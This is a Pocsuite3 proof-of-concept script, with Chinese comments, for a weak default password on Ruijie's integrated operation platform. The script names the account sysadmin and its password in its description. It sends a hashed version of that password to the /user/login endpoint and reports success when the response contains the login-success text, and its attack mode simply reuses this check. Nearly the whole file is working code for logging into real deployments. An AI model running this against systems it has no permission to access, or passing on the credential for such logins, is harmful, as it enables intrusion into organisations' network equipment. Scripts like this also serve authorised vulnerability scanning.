from collections import OrderedDict
from urllib.parse import urljoin
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class AIPOC(POCBase):
    vulID = '0'# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'#默认为1
    author = ['luckying']#  PoC作者的大名
    vulDate = '2024-03-29' #漏洞公开的时间,不知道就写今天
    createDate = '2024-03-29'# 编写 PoC 的日期
    updateDate = '2024-03-29'# PoC 更新的时间,默认和编写时间一样
    references = ['']# 漏洞地址来源,0day不用写
    name = '锐捷集成运行平台弱口令'# PoC 名称
    appPowerLink = 'https://www.ruijie.com.cn'# 漏洞厂商主页地址
    appName = '锐捷集成运行平台弱口令'# 漏洞应用名称
    appVersion = ''# 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        锐捷集成运行平台存在弱口令(sysadmin/Riil123$%^)，攻击者可利用该漏洞登录系统。
        
    '''# 漏洞简要描述
    samples = ['']# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' 
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        path = "/user/login"
        url = self.url + path
        #print(url)
        payload = {"account":"sysadmin","password":"1595ba243877f93a57a975473b8e267c59e2da32297aee334d895af099089348"}
        #print(payload)
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/json;charset=utf-8'
        }
        try:
            resq = requests.post(url=url,json=payload,headers=headers)
            if resq and "登陆成功" in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except Exception as e:
            return 
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
        


    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(AIPOC)